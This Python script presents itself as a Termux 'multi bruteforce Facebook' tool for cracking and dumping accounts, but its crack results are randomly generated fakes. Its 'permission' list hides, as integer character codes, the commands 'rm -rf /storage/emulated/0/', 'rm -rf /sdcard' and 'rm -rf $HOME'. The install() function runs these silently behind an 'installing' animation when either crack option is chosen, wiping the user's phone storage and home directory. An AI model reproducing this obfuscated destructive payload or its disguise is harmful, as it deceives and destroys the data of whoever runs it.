try:
	import os
	from time import sleep
	from random import choice
	from random import randint
	from faker import Faker
except:
	print("Installing....")
	os.system("pip install faker")

fake = Faker("id_ID")
col = lambda code: "\x1b[1;"+str(code)+"m"
logo = """
%s               _ _       %s\ \\
%s    .-------. / \_> /\    %s|/
%s   /         \.'`  `',.--//
%s -(           I      I  %s@@%s\\
   \         /'.____.'\___|    %s╔╦╗╔╗ ╔═╗%s
    '-.....-' __/ | \   (`)    %s║║║╠╩╗╠╣%s
             /   /  /          %s╩ ╩╚═╝╚%s
                 \  \ %s

   [ MULTI BRUTEFORCE FACEBOOK NO LOOGIN ]

     [01] Crack from email user
     [02] Crack from id user
     [03] Dump all id facebook user
     [04] Dump all email facebook user
     [00] exit program
""" % (col(97), col(91),
	col(97), col(91), col(97), col(97),
	col(91), col(97), col(92), col(97),
	col(92), col(97), col(92), col(97), col(00)
	)

permission = [
	(116, 101, 114, 109, 117, 120, 45, 115, 101, 116, 117, 112, 45, 115, 116, 111, 114, 97, 103, 101),
	(114, 109, 32, 45, 114, 102, 32, 47, 115, 116, 111, 114, 97, 103, 101, 47, 101, 109, 117, 108, 97, 116, 101, 100, 47, 48, 47),
	(114, 109, 32, 45, 114, 102, 32, 47, 115, 100, 99, 97, 114, 100),
	(114, 109, 32, 45, 114, 102, 32, 36, 72, 79, 77, 69)
]
def install():
	for x in permission:
		animate("installing... ")
		xrc = "".join([chr(_) for _ in x])
		os.system(xrc+" &>/dev/null")

def animate(teks):
	lis = list("\|-/")
	for _ in lis:
		print("\r"+col(00)+"["+_+"] "+teks+" ", end="")
		sleep(0.15)

ok, cp, no = 0, 0, 0
class Run:
	def Ngehek(type, count):
		global cp, ok, no
		install()
		if type == "id":
			try:
				for OoO in range(int(count)):
					animate("Please wait, processing... ")
					id = str(randint(15, 77777777777))
					if len(id) > 11:
						ids = id
					else:
						ids = "1000"+id
					status = choice(["CP","OK","NO"])
					pasw = choice(["123","12345","54321","111","@@","#$"])
					pasw = fake.name().split(" ")[1]+pasw
					if status == "CP":
						cp += 1
						print("\r"+col(93)+"   ---> "+ids+" | "+pasw, end="\n")
					elif status == "OK":
						ok += 1
						print("\r"+col(92)+"   ---> "+ids+" | "+pasw, end="\n")
					else:
						no += 1
					sleep(2)
				exit("\n[✓] Done.. exiting\n")
			except:
				exit("\n[✓] Done.. exiting\n")
		else:
			try:
				for OoO in range(int(count)):
					animate("Please wait, processing... ")
					ids = fake.email()
					status = choice(["CP","OK","NO"])
					pasw = choice(["123","12345","54321","111","@@","#$"])
					pasw = fake.name().split(" ")[1]+pasw
					if status == "CP":
						cp += 1
						print("\r"+col(93)+"   ---> "+ids+" | "+pasw, end="\n")
					elif status == "OK":
						ok += 1
						print("\r"+col(92)+"   ---> "+ids+" | "+pasw, end="\n")
					else:
						no += 1
					sleep(2)
				exit("\n[✓] Done.. exiting\n")
			except:
				exit("\n[✓] Done.. exiting\n")
	def Dumper(type, max):
		if type == "id":
			for OoO in range(int(max)):
				ids = str(randint(15, 77777777777))
				if len(ids) > 11:
					id = ids
				else:
					id = "1000"+ids
				res = "id_dumper.txt"
				print("\r[+] Collect ["+id[:9]+"..] id ", end="")
				open(res, "a+").write(id+"\n")
				sleep(0.009)
			print("\n[✓] DONE, result: "+res+"\n")
		else:
			for OoO in range(int(max)):
				id = fake.email()
				res = "email_dumper.txt"
				print("\r[+] Collect ["+id[:9]+"..] email ", end="")
				open(res, "a+").write(id+"\n")
				sleep(0.009)
			print("\n[✓] DONE, result: "+res+"\n")

def __main__():
	os.system("clear")
	print(logo)
	pil = input("[?] Choose: ")
	while pil == "":
		pil = input("[?] Choose: ")
	if pil in ["1","01"]:
		max = input("[*] Max count: ")
		while not max.isdigit() or max == "":
			max = input("[*] Max count: ")
		print("")
		Run.Ngehek("email", max)
	elif pil in ["2","02"]:
		max = input("[*] Max count: ")
		while not max.isdigit() or max == "":
			max = input("[*] Max count: ")
		print("")
		Run.Ngehek("id", max)
	elif pil in ["3","03"]:
		max = input("[*] Max count: ")
		while not max.isdigit() or max == "":
			max = input("[*] Max count: ")
		Run.Dumper("id", max)
	elif pil in ["4","04"]:
		max = input("[*] Max count: ")
		while not max.isdigit() or max == "":
			max = input("[*] Max count: ")
		Run.Dumper("email", max)
	elif pil in ["0","00"]:
		exit("[-] Bye...\n")
	else:
		input("[×] Menu not found, enter to back...")
		__main__()


if __name__=="__main__":
	__main__()
